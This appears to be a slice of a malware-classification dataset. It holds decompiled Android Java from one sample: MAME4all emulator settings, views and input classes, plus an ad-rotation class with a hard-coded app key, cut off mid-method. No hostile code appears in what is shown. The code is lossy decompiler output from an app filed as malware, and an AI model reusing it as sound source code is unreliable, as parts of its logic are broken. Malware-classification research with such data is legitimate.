"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.prefs\UserPreferences.code","public class UserPreferences extends PreferenceActivity implements SharedPreferences.OnSharedPreferenceChangeListener {   protected ListPreference mPrefAnalogDZ;   protected ListPreference mPrefControllerType;   protected ListPreference mPrefExtInput;   protected ListPreference mPrefGlobalVideoRenderMode;   protected ListPreference mPrefLandsFilterType;   protected ListPreference mPrefLandsMode;   protected ListPreference mPrefPortraitFilterType;   protected ListPreference mPrefPortraitMode;   protected ListPreference mPrefTiltDZ;   private SharedPreferences settings;   @Override protected void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     addPreferencesFromResource(R.xml.userpreferences);     this.settings=PreferenceManager.getDefaultSharedPreferences(this);     this.mPrefGlobalVideoRenderMode=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_GLOBAL_VIDEO_RENDER_MODE);     this.mPrefPortraitMode=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_PORTRAIT_SCALING_MODE);     this.mPrefLandsMode=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_LANDSCAPE_SCALING_MODE);     this.mPrefPortraitFilterType=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_PORTRAIT_FILTER_TYPE);     this.mPrefLandsFilterType=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_LANDSCAPE_FILTER_TYPE);     this.mPrefControllerType=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_CONTROLLER_TYPE);     this.mPrefExtInput=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_INPUT_EXTERNAL);     this.mPrefAnalogDZ=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_ANALOG_DZ);     this.mPrefTiltDZ=(ListPreference)getPreferenceScreen().findPreference(PrefsHelper.PREF_TILT_DZ);   }   @Override protected void onResume(){     super.onResume();     this.mPrefGlobalVideoRenderMode.setSummary(""Current value is '"" + ((Object)this.mPrefGlobalVideoRenderMode.getEntry()) + ""'"");     this.mPrefPortraitMode.setSummary(""Current value is '"" + ((Object)this.mPrefPortraitMode.getEntry()) + ""'"");     this.mPrefLandsMode.setSummary(""Current value is '"" + ((Object)this.mPrefLandsMode.getEntry()) + ""'"");     this.mPrefPortraitFilterType.setSummary(""Current value is '"" + ((Object)this.mPrefPortraitFilterType.getEntry()) + ""'"");     this.mPrefLandsFilterType.setSummary(""Current value is '"" + ((Object)this.mPrefLandsFilterType.getEntry()) + ""'"");     this.mPrefControllerType.setSummary(""Current value is '"" + ((Object)this.mPrefControllerType.getEntry()) + ""'"");     this.mPrefExtInput.setSummary(""Current value is '"" + ((Object)this.mPrefExtInput.getEntry()) + ""'"");     this.mPrefAnalogDZ.setSummary(""Current value is '"" + ((Object)this.mPrefAnalogDZ.getEntry()) + ""'"");     this.mPrefTiltDZ.setSummary(""Current value is '"" + ((Object)this.mPrefTiltDZ.getEntry()) + ""'"");     getPreferenceScreen().getSharedPreferences().registerOnSharedPreferenceChangeListener(this);   }   @Override protected void onPause(){     super.onPause();     getPreferenceScreen().getSharedPreferences().unregisterOnSharedPreferenceChangeListener(this);   }   @Override public void onSharedPreferenceChanged(  SharedPreferences sharedPreferences,  String key){     if (key.equals(PrefsHelper.PREF_PORTRAIT_SCALING_MODE)) {       this.mPrefPortraitMode.setSummary(""Current value is '"" + ((Object)this.mPrefPortraitMode.getEntry()) + ""'"");     }  else     if (key.equals(PrefsHelper.PREF_LANDSCAPE_SCALING_MODE)) {       this.mPrefLandsMode.setSummary(""Current value is '"" + ((Object)this.mPrefLandsMode.getEntry()) + ""'"");     }     if (key.equals(PrefsHelper.PREF_PORTRAIT_FILTER_TYPE)) {       this.mPrefPortraitFilterType.setSummary(""Current value is '"" + ((Object)this.mPrefPortraitFilterType.getEntry()) + ""'"");       return;     }     if (key.equals(PrefsHelper.PREF_LANDSCAPE_FILTER_TYPE)) {       this.mPrefLandsFilterType.setSummary(""Current value is '"" + ((Object)this.mPrefLandsFilterType.getEntry()) + ""'"");       return;     }     if (key.equals(PrefsHelper.PREF_CONTROLLER_TYPE)) {       this.mPrefControllerType.setSummary(""Current values is '"" + ((Object)this.mPrefControllerType.getEntry()) + ""'"");       return;     }     if (key.equals(PrefsHelper.PREF_GLOBAL_VIDEO_RENDER_MODE)) {       this.mPrefGlobalVideoRenderMode.setSummary(""Current value is '"" + ((Object)this.mPrefGlobalVideoRenderMode.getEntry()) + ""'"");       return;     }     if (key.equals(PrefsHelper.PREF_INPUT_EXTERNAL)) {       this.mPrefExtInput.setSummary(""Current value is '"" + ((Object)this.mPrefExtInput.getEntry()) + ""'"");     }  else     if (key.equals(PrefsHelper.PREF_ANALOG_DZ)) {       this.mPrefAnalogDZ.setSummary(""Current value is '"" + ((Object)this.mPrefAnalogDZ.getEntry()) + ""'"");     }  else     if (key.equals(PrefsHelper.PREF_TILT_DZ)) {       this.mPrefTiltDZ.setSummary(""Current value is '"" + ((Object)this.mPrefTiltDZ.getEntry()) + ""'"");     }   }   @Override public boolean onPreferenceTreeClick(  PreferenceScreen preferenceScreen,  Preference pref){     if (pref.getKey().equals(""defineKeys"")) {       startActivityForResult(new Intent(this,(Class<?>)DefineKeys.class),1);     }  else     if (pref.getKey().equals(""changeRomPath"")) {       AlertDialog.Builder builder=new AlertDialog.Builder(this);       builder.setMessage(""Are you sure to change? (needs app restart)"").setCancelable(false).setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int id){           SharedPreferences.Editor editor=UserPreferences.this.settings.edit();           editor.putString(PrefsHelper.PREF_ROMsDIR,null);           editor.commit();         }       } ).setNegativeButton(""No"",new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int id){           dialog.cancel();         }       } );       Dialog dialog=builder.create();       dialog.show();     }  else     if (pref.getKey().equals(""defaultsKeys"")) {       AlertDialog.Builder builder2=new AlertDialog.Builder(this);       builder2.setMessage(""Are you sure to restore?"").setCancelable(false).setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog2,        int id){           SharedPreferences.Editor editor=UserPreferences.this.settings.edit();           StringBuffer definedKeysStr=new StringBuffer();           for (int i=0; i < InputHandler.defaultKeyMapping.length; i++) {             InputHandler.keyMapping[i]=InputHandler.defaultKeyMapping[i];             definedKeysStr.append(String.valueOf(InputHandler.defaultKeyMapping[i]) + "":"");           }           editor.putString(PrefsHelper.PREF_DEFINED_KEYS,definedKeysStr.toString());           editor.commit();         }       } ).setNegativeButton(""No"",new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog2,        int id){           dialog2.cancel();         }       } );       Dialog dialog2=builder2.create();       dialog2.show();     }  else     if (pref.getKey().equals(""customControlLayout"")) {       ControlCustomizer.setEnabled(true);       finish();     }  else     if (pref.getKey().equals(""defaultControlLayout"")) {       AlertDialog.Builder builder3=new AlertDialog.Builder(this);       builder3.setMessage(""Are you sure to restore?"").setCancelable(false).setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog3,        int id){           SharedPreferences.Editor editor=UserPreferences.this.settings.edit();           editor.putString(PrefsHelper.PREF_DEFINED_CONTROL_LAYOUT,null);           editor.commit();         }       } ).setNegativeButton(""No"",new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog3,        int id){           dialog3.cancel();         }       } );       Dialog dialog3=builder3.create();       dialog3.show();     }     return super.onPreferenceTreeClick(preferenceScreen,pref);   }   @Override protected void onActivityResult(  int requestCode,  int resultCode,  Intent data){     super.onActivityResult(requestCode,resultCode,data);     if (resultCode == -1 && requestCode == 0) {       setResult(-1,data);     }  else     if (requestCode == 1) {       SharedPreferences.Editor editor=this.settings.edit();       StringBuffer definedKeysStr=new StringBuffer();       for (int i=0; i < InputHandler.keyMapping.length; i++) {         definedKeysStr.append(String.valueOf(InputHandler.keyMapping[i]) + "":"");       }       editor.putString(PrefsHelper.PREF_DEFINED_KEYS,definedKeysStr.toString());       editor.commit();       return;     }     finish();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.views\EmulatorViewGL.code","public class EmulatorViewGL extends GLSurfaceView implements IEmuView {   protected MAME4all mm;   protected GLRenderer render;   protected int scaleType;   public GLSurfaceView.Renderer getRender(){     return this.render;   }   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;     this.render.setMAME4all(mm);   }   public EmulatorViewGL(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     this.render=null;     init();   }   public EmulatorViewGL(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     this.render=null;     init();   }   protected void init(){     setKeepScreenOn(true);     setFocusable(true);     setFocusableInTouchMode(true);     requestFocus();     this.render=new GLRenderer();     setRenderer(this.render);     setRenderMode(0);   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     Emulator.setWindowSize(w,h);   }   @Override public boolean onTrackballEvent(  MotionEvent event){     return this.mm.getInputHandler().onTrackballEvent(event);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.views\EmulatorViewHW.code","public class EmulatorViewHW extends View implements IEmuView {   protected int fps;   protected int i;   protected long millis;   protected MAME4all mm;   protected int scaleType;   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public EmulatorViewHW(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     this.i=0;     this.fps=0;     init();   }   public EmulatorViewHW(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     this.i=0;     this.fps=0;     init();   }   public EmulatorViewHW(  Context context,  AttributeSet attrs,  int defStyle){     super(context,attrs,defStyle);     this.scaleType=1;     this.mm=null;     this.i=0;     this.fps=0;     init();   }   protected void init(){     setKeepScreenOn(true);     setFocusable(true);     setFocusableInTouchMode(true);     requestFocus();   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     Emulator.setWindowSize(w,h);   }   @Override public boolean onTrackballEvent(  MotionEvent event){     return this.mm.getInputHandler().onTrackballEvent(event);   }   @Override public void draw(  Canvas canvas){     super.draw(canvas);     this.i++;     if (Emulator.getScreenBuffer() != null) {       canvas.concat(Emulator.getMatrix());       canvas.drawBitmap(Emulator.getScreenBuffPx(),0,Emulator.getEmulatedWidth(),0,0,Emulator.getEmulatedWidth(),Emulator.getEmulatedHeight(),false,(Paint)null);       if (Emulator.isDebug()) {         canvas.drawText(""HW "" + canvas.isHardwareAccelerated() + "" fps:""+ this.fps,5.0f,40.0f,Emulator.getDebugPaint());         if (System.currentTimeMillis() - this.millis >= 1000) {           this.fps=this.i;           this.i=0;           this.millis=System.currentTimeMillis();         }       }     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.views\EmulatorViewSW.code","public class EmulatorViewSW extends SurfaceView implements SurfaceHolder.Callback, IEmuView {   protected MAME4all mm;   protected int scaleType;   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public EmulatorViewSW(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     init();   }   public EmulatorViewSW(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     init();   }   public EmulatorViewSW(  Context context,  AttributeSet attrs,  int defStyle){     super(context,attrs,defStyle);     this.scaleType=1;     this.mm=null;     init();   }   protected void init(){     getHolder().addCallback(this);     setFocusable(true);     setFocusableInTouchMode(true);     requestFocus();   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     Emulator.setWindowSize(w,h);   }   @Override public void surfaceChanged(  SurfaceHolder holder,  int format,  int width,  int height){   }   @Override public void surfaceCreated(  SurfaceHolder holder){     Emulator.setHolder(holder);   }   @Override public void surfaceDestroyed(  SurfaceHolder holder){     Emulator.setHolder(null);   }   @Override public boolean onTrackballEvent(  MotionEvent event){     return this.mm.getInputHandler().onTrackballEvent(event);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.views\FilterView.code","public class FilterView extends View implements IEmuView {   protected MAME4all mm;   protected int scaleType;   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public FilterView(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     init();   }   public FilterView(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     init();   }   protected void init(){     setFocusable(false);     setFocusableInTouchMode(false);   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.views\IEmuView.code","public interface IEmuView {   int getScaleType();   void setMAME4all(  MAME4all mAME4all);   void setScaleType(  int i); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.views\InputView.code","public class InputView extends ImageView {   protected int ax;   protected int ay;   boolean bHasInit;   protected Bitmap bmp;   protected float dx;   protected float dy;   protected MAME4all mm;   protected Paint pnt;   protected Rect rdst;   protected Rect rsrc;   static BitmapDrawable[] stick_images=null;   static BitmapDrawable[][] btns_images=null;   public void release(){     this.bHasInit=false;     if (stick_images != null) {       for (int i=0; i < stick_images.length; i++) {         if (stick_images[i] != null && !stick_images[i].getBitmap().isRecycled()) {           stick_images[i].getBitmap().recycle();         }       }     }     if (btns_images != null) {       for (int i2=0; i2 < btns_images.length; i2++) {         if (btns_images[i2] != null) {           for (int j=0; j < btns_images[i2].length; j++) {             if (btns_images[i2][j] != null && !btns_images[i2][j].getBitmap().isRecycled()) {               btns_images[i2][j].getBitmap().recycle();             }           }         }       }     }     stick_images=null;     btns_images=null;     this.bHasInit=false;   }   public void setMAME4all(  MAME4all mm){     this.mm=mm;     this.bHasInit=false;     if (btns_images == null) {       btns_images=(BitmapDrawable[][])Array.newInstance((Class<?>)BitmapDrawable.class,10,2);       btns_images[1][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_a);       btns_images[1][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_a_press);       btns_images[2][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_b);       btns_images[2][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_b_press);       btns_images[3][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_x);       btns_images[3][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_x_press);       btns_images[0][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_y);       btns_images[0][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_y_press);       btns_images[4][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l1);       btns_images[4][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l1_press);       btns_images[5][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r1);       btns_images[5][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r1_press);       btns_images[6][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l2);       btns_images[6][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l2_press);       btns_images[7][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r2);       btns_images[7][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r2_press);       btns_images[9][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_start);       btns_images[9][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_start_press);       btns_images[8][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_select);       btns_images[8][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_select_press);     }     this.bHasInit=true;   }   public InputView(  Context context){     super(context);     this.mm=null;     this.bmp=null;     this.pnt=new Paint();     this.rsrc=new Rect();     this.rdst=new Rect();     this.ax=0;     this.ay=0;     this.dx=1.0f;     this.dy=1.0f;     this.bHasInit=false;     init();   }   public InputView(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mm=null;     this.bmp=null;     this.pnt=new Paint();     this.rsrc=new Rect();     this.rdst=new Rect();     this.ax=0;     this.ay=0;     this.dx=1.0f;     this.dy=1.0f;     this.bHasInit=false;     init();   }   public InputView(  Context context,  AttributeSet attrs,  int defStyle){     super(context,attrs,defStyle);     this.mm=null;     this.bmp=null;     this.pnt=new Paint();     this.rsrc=new Rect();     this.rdst=new Rect();     this.ax=0;     this.ay=0;     this.dx=1.0f;     this.dy=1.0f;     this.bHasInit=false;     init();   }   protected void init(){     this.pnt.setARGB(255,255,255,255);     this.pnt.setStyle(Paint.Style.STROKE);     this.pnt.setARGB(255,255,255,255);     this.pnt.setTextSize(16.0f);     setFocusable(true);     setFocusableInTouchMode(true);   }   @Override public void setImageDrawable(  Drawable drawable){     if (drawable != null) {       BitmapDrawable bmpdrw=(BitmapDrawable)drawable;       this.bmp=bmpdrw.getBitmap();     }  else {       this.bmp=null;     }     super.setImageDrawable(drawable);   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     int widthSize;     int heightSize;     if (this.mm == null) {       super.onMeasure(widthMeasureSpec,heightMeasureSpec);       return;     }     if (this.mm.getMainHelper().getscrOrientation() == 2) {       widthSize=this.mm.getWindowManager().getDefaultDisplay().getWidth();       heightSize=this.mm.getWindowManager().getDefaultDisplay().getHeight();     }  else {       int w=1;       int h=1;       if (this.mm != null && this.mm.getInputHandler().getMainRect() != null) {         w=this.mm.getInputHandler().getMainRect().width();         h=this.mm.getInputHandler().getMainRect().height();       }       if (w == 0) {         w=1;       }       if (h == 0) {         h=1;       }       float desiredAspect=w / h;       widthSize=this.mm.getWindowManager().getDefaultDisplay().getWidth();       heightSize=(int)(widthSize / desiredAspect);     }     setMeasuredDimension(widthSize,heightSize);   }   public void updateImages(){     ArrayList<InputValue> data=this.mm.getInputHandler().getAllInputData();     if (data != null) {       for (int i=0; i < data.size(); i++) {         InputValue v=data.get(i);         if (v.getType() == 5) {           btns_images[v.getValue()][0].setBounds(v.getRect());           btns_images[v.getValue()][0].setAlpha(this.mm.getInputHandler().getOpacity());           btns_images[v.getValue()][1].setBounds(v.getRect());           btns_images[v.getValue()][1].setAlpha(this.mm.getInputHandler().getOpacity());         }       }     }   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     int bw=1;     int bh=1;     if (this.mm != null && this.mm.getInputHandler().getMainRect() != null) {       bw=this.mm.getInputHandler().getMainRect().width();       bh=this.mm.getInputHandler().getMainRect().height();     }     if (bw == 0) {       bw=1;     }     if (bh == 0) {       bh=1;     }     float desiredAspect=bw / bh;     int tmp=(int)(w / desiredAspect);     if (tmp <= h) {       this.ax=0;       this.ay=(h - tmp) / 2;       h=tmp;     }  else {       int tmp2=(int)(h * desiredAspect);       this.ay=0;       this.ax=(w - tmp2) / 2;       w=tmp2;     }     this.dx=w / bw;     this.dy=h / bh;     if (this.mm != null && this.mm.getInputHandler() != null) {       this.mm.getInputHandler().setFixFactor(this.ax,this.ay,this.dx,this.dy);       updateImages();     }   }   @Override protected void onDraw(  Canvas canvas){     int i;     if (this.bHasInit) {       if (this.bmp != null) {         super.onDraw(canvas);       }       if (this.mm != null) {         ArrayList<InputValue> data=this.mm.getInputHandler().getAllInputData();         while (i < data.size()) {           InputValue v=data.get(i);           BitmapDrawable d=null;           if (this.mm.getPrefsHelper().getControllerType() != 1 && v.getType() == 8 && canvas.getClipBounds().intersect(v.getRect())) {             this.mm.getInputHandler().getAnalogStick().draw(canvas);           }  else           if (v.getType() == 5 && canvas.getClipBounds().intersect(v.getRect())) {             if (this.mm.getMainHelper().getscrOrientation() == 2) {               int n=Emulator.getValue(3);               int b=v.getValue();               if (!ControlCustomizer.isEnabled()) {                 if (!mainActivity.sIswhowallkey) {                   if (b == 0) {                     i=n < 4 ? i + 1 : 0;                   }                   if (b == 1) {                     if (n < 3) {                     }                   }                   if (b == 3) {                     if (n < 2) {                     }                   }                   if (b == 2 && n < 1) {                   }                 }                 if (b == 4) {                   if (Emulator.getValue(4) == 1) {                   }                 }                 if (b == 5 && Emulator.getValue(4) == 1) {                 }               }             }             d=btns_images[v.getValue()][this.mm.getInputHandler().getBtnStates()[v.getValue()]];           }           if (d != null) {             d.draw(canvas);           }         }         if (ControlCustomizer.isEnabled()) {           this.mm.getInputHandler().getControlCustomizer().draw(canvas);         }         if (Emulator.isDebug()) {           ArrayList<InputValue> ids=this.mm.getInputHandler().getAllInputData();           Paint p2=new Paint();           p2.setARGB(255,255,255,255);           p2.setStyle(Paint.Style.STROKE);           for (int i2=0; i2 < ids.size(); i2++) {             InputValue v2=ids.get(i2);             Rect r=v2.getRect();             if (r != null) {               if (v2.getType() == 3) {                 canvas.drawRect(r,p2);               }  else               if (this.mm.getPrefsHelper().getControllerType() == 1 && v2.getType() == 2) {                 canvas.drawRect(r,p2);               }  else               if (this.mm.getPrefsHelper().getControllerType() != 1 && v2.getType() == 8) {                 canvas.drawRect(r,p2);               }             }           }           p2.setTextSize(20.0f);           if (TiltSensor.isEnabled()) {             canvas.drawText(TiltSensor.str,100.0f,100.0f,p2);           }         }       }     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.ui\localAdView.code","public class localAdView extends FrameLayout {   public static final int LAYOUT_BOOTOM=2;   public static final int LAYOUT_MIN=0;   public static final int LAYOUT_TOP=1;   static final int MSG_CHANGEADVIEW=20;   public static final int MSG_TIMER=16;   int CHANGADTIME;   int MaxDelayTime;   boolean bNeedReset;   boolean bisDomoOnly;   boolean bisShowDDAd;   boolean bisinit;   View closebt;   int defaulrate;   int mAdShowState;   ViewGroup mAdViewLayout;   int mBgImg;   LinearLayout mBottomAdLayout;   Handler mHandler;   LinearLayout mLinearLayout;   ViewGroup mLocalAdview;   int mMinCount;   int mOtherAdShowTime;   int mQQAdShowTime;   LinearLayout mQQLinearLayout;   View mQQadView;   String mStrAirAdKey;   String mStrQQKey;   String mStrVponKey;   int mVponAdShowTime;   boolean m_bHasShowAirAd;   boolean m_bHasShowOther;   boolean m_bHasShowVpon;   boolean m_bShowAirVponOnce;   Activity m_context;   boolean mbIsActivity;   boolean mbIsAtBt;   boolean mbIsMainActivity;   boolean mbIsQQIn;   boolean mbIsShowQQFirst;   boolean mbIsShowqq;   int mbgColor;   float mfdensity;   int mnBgColor;   long mnLastSetTime;   int mnLastVisible;   int mnLayout;   int mnMaxAdvieHeight;   int mnPauseTimes;   int mnstarttime;   int mnsuitableHeight;   int nCound;   int nNoAdCount;   int nshowddrate;   public static boolean sbisshowclose=false;   public static boolean sIsShowNoFull=false;   static boolean bisstartpush=false;   public static String sstrAdviewID=null;   public static String sstrAdviewID2=null;   public static String sappKey=""zY9wKAv6t6NawlWg4VGj8sTB"";   public static boolean sbisshowcloseUp=false;   public localAdView(  Context context,  int bgImg,  int nLayout,  boolean bIsMain){     super(context);     this.m_context=null;     this.mnLayout=0;     this.mbIsMainActivity=false;     this.mfdensity=1.0f;     this.mnsuitableHeight=75;     this.mLocalAdview=null;     this.closebt=null;     this.mQQLinearLayout=null;     this.mLinearLayout=null;     this.mQQadView=null;     this.mAdViewLayout=null;     this.mBottomAdLayout=null;     this.mbIsShowQQFirst=false;     this.CHANGADTIME=1000;     this.mbIsAtBt=false;     this.mQQAdShowTime=0;     this.mOtherAdShowTime=0;     this.mVponAdShowTime=0;     this.m_bHasShowOther=false;     this.m_bHasShowVpon=false;     this.m_bHasShowAirAd=false;     this.m_bShowAirVponOnce=false;     this.mAdShowState=1;     this.nNoAdCount=0;     this.mbIsActivity=false;     this.mnMaxAdvieHeight=0;     this.mMinCount=0;     this.mbIsQQIn=false;     this.mnPauseTimes=0;     this.mnLastVisible=1;     this.nCound=0;     this.mnLastSetTime=0L;     this.mbIsShowqq=false;     this.mHandler=new Handler(){       @Override public void handleMessage(      Message msg){         super.handleMessage(msg);         if (localAdView.this.mHandler != null) {           localAdView.this.ChangeAdView();           localAdView.this.mHandler.sendEmptyMessageDelayed(localAdView.MSG_CHANGEADVIEW,localAdView.this.CHANGADTIME);         }       }     } ;     this.mBgImg=0;     this.mStrVponKey="""";     this.mStrAirAdKey="""";     this.mStrQQKey="""";     this.mbgColor=-1;     this.nshowddrate=100;     this.defaulrate=101;     this.bisShowDDAd=false;     this.bisDomoOnly=false;     this.mnstarttime=0;     this.bNeedReset=true;     this.MaxDelayTime=1000;     this.bisinit=false;     this.mnBgColor=-13408666;     this.mbIsMainActivity=bIsMain;     this.m_context=(Activity)context;     this.mBgImg=bgImg;     this.mnLayout=nLayout;     setView();     DisplayMetrics displayMetrics=getContext().getResources().getDisplayMetrics();     this.mfdensity=displayMetrics.density;     if (this.mfdensity <= 0.75d) {       this.mnsuitableHeight=38;       return;     }     if (this.mfdensity <= 1.0f) {       this.mnsuitableHeight=50;     }  else     if (this.mfdensity <= 1.5d) {       this.mnsuitableHeight=75;     }  else {       this.mnsuitableHeight=100;     }   }   public localAdView(  Context context,  AttributeSet attrs){     super(context,attrs);     this.m_context=null;     this.mnLayout=0;     this.mbIsMainActivity=false;     this.mfdensity=1.0f;     this.mnsuitableHeight=75;     this.mLocalAdview=null;     this.closebt=null;     this.mQQLinearLayout=null;     this.mLinearLayout=null;     this.mQQadView=null;     this.mAdViewLayout=null;     this.mBottomAdLayout=null;     this.mbIsShowQQFirst=false;     this.CHANGADTIME=1000;     this.mbIsAtBt=false;     this.mQQAdShowTime=0;     this.mOtherAdShowTime=0;     this.mVponAdShowTime=0;     this.m_bHasShowOther=false;     this.m_bHasShowVpon=false;     this.m_bHasShowAirAd=false;     this.m_bShowAirVponOnce=false;     this.mAdShowState=1;     this.nNoAdCount=0;     this.mbIsActivity=false;     this.mnMaxAdvieHeight=0;     this.mMinCount=0;     this.mbIsQQIn=false;     this.mnPauseTimes=0;     this.mnLastVisible=1;     this.nCound=0;     this.mnLastSetTime=0L;     this.mbIsShowqq=false;     this.mHandler=new Handler(){       @Override public void handleMessage(      Message msg){         super.handleMessage(msg);         if (localAdView.this.mHandler != null) {           localAdView.this.ChangeAdView();           localAdView.this.mHandler.sendEmptyMessageDelayed(localAdView.MSG_CHANGEADVIEW,localAdView.this.CHANGADTIME);         }       }     } ;     this.mBgImg=0;     this.mStrVponKey="""";     this.mStrAirAdKey="""";     this.mStrQQKey="""";     this.mbgColor=-1;     this.nshowddrate=100;     this.defaulrate=101;     this.bisShowDDAd=false;     this.bisDomoOnly=false;     this.mnstarttime=0;     this.bNeedReset=true;     this.MaxDelayTime=1000;     this.bisinit=false;     this.mnBgColor=-13408666;     this.m_context=(Activity)context;     setView();   }   void setView(){     InitAdview2();   }   void ReSize1(){   }   void ReSize(){   }   int getMaxAdHeight(){     return 80;   }   void ChangeAdView(){     if (sIsShowNoFull) {       if (getVisibility() != this.mnLastVisible) {         this.nCound=0;         this.mnLastVisible=getVisibility();         return;       }       this.nCound++;       if (this.nCound >= 30) {         if (getVisibility() == 0) {           setVisibility(4);         }  else {           setVisibility(0);         }       }     }   }   public void onDestroy(){     this.mHandler.removeMessages(16);     this.mHandler.removeMessages(MSG_CHANGEADVIEW);   }   public void OnPause(){     this.mbIsActivity=false;   }   public void OnResume(){     this.mbIsActivity=true;   }   public static boolean IsHightLevel(){     int sysVersion=Integer.parseInt(Build.VERSION.SDK);     return sysVersion >= 14;   }   int str2int(  String str){     if (str == null) {       return 0;     }     try {       return Integer.parseInt(str);     }  catch (    Exception e) {       return 0;     }   }   public static boolean checkvalidAzad(){     return true;   }   public void InitAdview2(){     if (!this.bisinit) {       